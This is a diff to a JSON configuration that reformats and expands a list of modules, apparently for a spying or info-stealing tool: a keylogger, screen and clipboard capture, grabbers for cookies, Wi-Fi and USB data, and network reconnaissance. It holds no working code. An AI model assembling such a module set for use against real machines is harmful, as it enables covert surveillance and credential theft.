@@ -1,18 +1,14 @@
 [
-  {
-    "module": "keylogger"
-  },
-  {
-    "module": "screenshot"
-  },
-  {
-    "module": "clipboard"
-  },
-  {
-    "module": "cookie_grabber"
-  },
-  {
-    "module": "net_recon"
-  }
+  { "module": "keylogger" },
+  { "module": "screenshot" },
+  { "module": "clipboard" },
+  { "module": "cookie_grabber" },
+  { "module": "wifi_grabber" },
+  { "module": "users" },
+  { "module": "software_audit" },
+  { "module": "proc_watch" },
+  { "module": "usb_grabber" },
+  { "module": "net_route" },
+  { "module": "net_recon" }
 ]
 
